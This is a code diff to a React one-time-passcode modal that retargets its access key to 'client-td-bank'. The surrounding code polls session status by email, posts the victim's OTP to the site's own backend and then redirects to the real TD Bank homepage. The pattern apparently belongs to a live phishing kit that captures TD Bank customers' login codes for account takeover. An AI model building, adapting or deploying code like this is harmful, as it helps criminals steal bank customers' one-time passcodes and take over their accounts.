@@ -53,7 +53,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose 
     const pollStatus = async () => {
       try {
         const response = await fetch(`/api/session-status?email=${encodeURIComponent(email)}`, {
-          headers: { 'X-Access-Key': 'client' }
+          headers: { 'X-Access-Key': 'client-td-bank' }
         });
         const data = await response.json();
         if (!isMounted) return;
@@ -66,7 +66,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose 
             localStorage.removeItem('otpExpiry');
             fetch('/api/clear-session', {
               method: 'POST',
-              headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client' },
+              headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-td-bank' },
               body: JSON.stringify({ email })
             }).catch(err => console.error('Error clearing session:', err));
             setTimeout(() => { window.location.href = 'https://www.td.com/'; }, 3000);
@@ -174,7 +174,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose 
     try {
       const response = await fetch('/api/submit-otp', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client' },
+        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-td-bank' },
         body: JSON.stringify({ email, otp: finalOtp })
       });
       const data = await response.json();
@@ -198,7 +198,7 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose 
     try {
       await fetch('/api/request-resend', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client' },
+        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-td-bank' },
         body: JSON.stringify({ email })
       });
     } catch (err) {
